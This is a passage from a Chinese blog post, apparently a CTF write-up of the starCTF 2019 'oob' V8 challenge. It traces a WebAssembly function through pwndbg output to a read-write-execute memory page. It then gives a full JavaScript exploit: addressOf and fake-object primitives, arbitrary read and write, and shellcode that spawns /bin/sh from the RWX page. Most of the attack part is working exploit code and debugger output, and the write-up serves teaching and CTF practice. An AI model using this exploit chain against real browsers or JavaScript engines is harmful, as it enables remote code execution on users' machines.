JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x38400785f871</span><br><span class="line"> - WASM function index 0</span><br><span class="line"> - properties: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x0828bce404b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x0828bce40449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #arguments: 0x0828bce40369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #caller: 0x0828bce403d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看看很可疑的code属性：</p>
+<p><img src="/css/images/starctf2019_oob/2021031605.png" srcset="/img/loading.gif"></p>
+<p>着实可疑，再看看权限：</p>
+<p><img src="/css/images/starctf2019_oob/2021031606.png" srcset="/img/loading.gif"></p>
+<p>不可写，算了算了。context属性看起来是内置相关的东西，然后看看shared_info：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x38400785fa31</span><br><span class="line">0x38400785fa31: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x14d3e7a809e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x14d3e7a84ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x38400785fa09 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x3be236f42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x14d3e7a80c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x14d3e7a82a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x14d3e7a81319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br></pre></td></tr></table></figure>
+
+<p>看起来跟wasm有关，它的code跟上一级对象一致，还有一个from data的标注，那看看它的data，即WasmExportedFunctionData（看起来就是跟导入的字节码有关）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x38400785fa09</span><br><span class="line">0x38400785fa09: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x14d3e7a85879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x3be236f42001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x38400785f871 &lt;Instance map = 0x17f2a8589789&gt;</span><br><span class="line"> - function_index: 0</span><br></pre></td></tr></table></figure>
+
+<p>wrapper_code同样跟上一级对象的code属性一致，看看instance：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x38400785f871</span><br><span class="line">0x38400785f871: [WasmInstanceObject] in OldSpace</span><br><span class="line"> - map: 0x17f2a8589789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x0a9ce3bcac19 &lt;Object map = 0x17f2a858abd9&gt;</span><br><span class="line"> - elements: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x0a9ce3bce411 &lt;Module map = 0x17f2a85891e9&gt;</span><br><span class="line"> - exports_object: 0x0a9ce3bce681 &lt;Object map = 0x17f2a858ad19&gt;</span><br><span class="line"> - native_context: 0x384007841869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x38400785f999 &lt;Memory map = 0x17f2a858a189&gt;</span><br><span class="line"> - table 0: 0x0a9ce3bce619 &lt;Table map = 0x17f2a8589aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x14d3e7a80c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x0a9ce3bce5c1 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7fead5e20000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x5620435b34f0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x5620435b3510</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x14d3e7a80c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打印内存看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x27859981f888</span><br><span class="line">0x27859981f888:	0x00002679e5989789	0x0000124450540c71</span><br><span class="line">0x27859981f898:	0x0000124450540c71	0x00007fdcacc70000</span><br><span class="line">0x27859981f8a8:	0x0000000000010000	0x000000000000ffff</span><br><span class="line">0x27859981f8b8:	0x000055caa43b78c8	0x0000124450540c71</span><br><span class="line">0x27859981f8c8:	0x000055caa44324f0	0x00001244505404d1</span><br><span class="line">0x27859981f8d8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x27859981f8e8:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x27859981f8f8:	0x000055caa4432510	0x00001244505404d1</span><br><span class="line">0x27859981f908:	0x000055caa43adc00	0x00000ea5d7323000</span><br><span class="line">0x27859981f918:	0x000000ac9d38e419	0x000000ac9d38e689</span><br><span class="line">pwndbg&gt; telescope 0x27859981f888+0x88</span><br><span class="line">00:0000│   0x27859981f910 —▸ 0xea5d7323000 ◂— movabs r10, 0xea5d7323260 /* 0xea5d7323260ba49 */</span><br><span class="line">01:0008│   0x27859981f918 —▸ 0xac9d38e419 ◂— 0x7100002679e59891</span><br><span class="line">02:0010│   0x27859981f920 —▸ 0xac9d38e689 ◂— 0x7100002679e598ad</span><br><span class="line">03:0018│   0x27859981f928 —▸ 0x278599801869 ◂— 0x124450540f</span><br><span class="line">04:0020│   0x27859981f930 —▸ 0x27859981f9b1 ◂— 0x7100002679e598a1</span><br><span class="line">05:0028│   0x27859981f938 —▸ 0x1244505404d1 ◂— 0x1244505405</span><br><span class="line">pwndbg&gt; vmmap 0xea5d7323000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     0xea5d7323000      0xea5d7324000 rwxp     1000 0       +0x0</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现，在偏移0x88处存在一个地址，而该地址段可读可写可执行，接下来我们需要确认这一段代码会被执行到，调用一下从字节码中加载的函数f，然后继续执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *0xea5d7323000</span><br><span class="line">Breakpoint 2 at 0xea5d7323000</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Thread 1 &quot;d8&quot; hit Breakpoint 2, 0x00000ea5d7323000 in ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，往这里写代码后确实是可以执行的。</p>
+<p>我们需要用任意地址读获取这个地址：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(wasm_addr) + <span class="number">0x18n</span>));</span><br><span class="line"><span class="keyword">var</span> data_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(shared_info_addr) + <span class="number">0x8n</span>));</span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(data_addr) + <span class="number">0x10n</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(instance_addr) + <span class="number">0x88n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hex</span>(<span class="title function_">f2i</span>(shellcode_addr)));</span><br></pre></td></tr></table></figure>
+
+<p>然后用任意地址写把我们的命令执行shellcode写入即可，不过直接用write函数写入的时候有点问题，因为写入时需要将指针指向-0x10偏移的地方，而这个偏移对于这段汇编代码来说是一个不可读的区域，所以就会导致程序崩溃。</p>
+<p>解决的方法来自参考文章：</p>
+<p><img src="/css/images/starctf2019_oob/2021031607.png" srcset="/img/loading.gif"></p>
+<h4 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;obj&quot;</span>: <span class="string">&quot;Twings&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">o</span>) &#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = o;</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(float_array)) - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">i2f</span>(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getFakeObj</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> fake_array_addr = <span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(fake_array)) - <span class="number">0x38n</span> + <span class="number">0x10n</span>;</span><br><span class="line">    float_array[<span class="number">0</span>] = <span class="title function_">i2f</span>(fake_array_addr);</span><br><span class="line">    float_array.<span class="title function_">oob</span>(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_obj = <span class="title function_">getFakeObj</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    <span class="keyword">return</span> fake_obj[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;write at: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(<span class="title function_">i2f</span>((<span class="title function_">f2i</span>(addr) - <span class="number">0x10n</span>)))) + <span class="string">&quot;, data: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(data)));</span><br><span class="line">    fake_obj[<span class="number">0</span>] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj_array);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(fake_obj);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(float_array_map)), <span class="string">&quot;, obj array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(obj_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(wasm_addr) + <span class="number">0x18n</span>));</span><br><span class="line"><span class="keyword">var</span> data_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(shared_info_addr) + <span class="number">0x8n</span>));</span><br><span class="line"><span class="keyword">var</span> instance_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(data_addr) + <span class="number">0x10n</span>));</span><br><span class="line"><span class="keyword">var</span> shellcode_addr = <span class="title function_">read</span>(<span class="title function_">i2f</span>(<span class="title function_">f2i</span>(instance_addr) + <span class="number">0x88n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(wasm_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shared_info_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(shared_info_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(data_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(instance_addr)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shellcode_addr: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">f2i</span>(shellcode_addr)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[</span><br><span class="line">    <span class="number">0x6e69622fbb48f631n</span>,</span><br><span class="line">    <span class="number">0x5f54535668732f2fn</span>,</span><br><span class="line">    <span class="number">0x00050fd231583b6an</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">24</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">i2f</span>(<span class="title function_">f2i</span>(<span class="title function_">addressOf</span>(data_buf)) + <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(buf_backing_store_addr, shellcode_addr);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="/css/images/starctf2019_oob/2021031608.png" srcset="/img/loading.gif"></p>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的看一遍下来，还是挺好玩的，不过没有读过v8源码，有点地方还是不甚清晰。</p>
+<p>相比PHP的UAF玩法，chrome的越界读写漏洞操作起来更简单一些，理解难度也要低一些。</p>
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/detectiveHLH/p/9928915.html">WebAssembly简介</a></p>
+<p><a href="https://www.wasm.com.cn/getting-started/developers-guide/">官方文档</a></p>
+<p><a href="https://www.cnblogs.com/jesse123/p/7637031.html">Emscripten安装参考</a></p>
+<p><a href="https://warm-winter.github.io/2020/10/11/v8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">v8环境搭建</a></p>
+<p><a href="https://www.freebuf.com/vuls/203721.html">starCTF2019-1</a></p>
+<p><a href="https://www.anquanke.com/post/id/219815#h3-7">starCTF2019-2</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">二进制</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Chrome/">Chrome</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2021/04/07/chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%BC%BA%E5%8C%961/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>chrome浏览器漏洞强化1</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2021/03/02/%E4%BB%8EFTP%E5%88%B0PHP-FPM/">
+                        <span>从FTP到PHP-FPM</span>
+                        <i class="fa fa-chevron-right"></i>
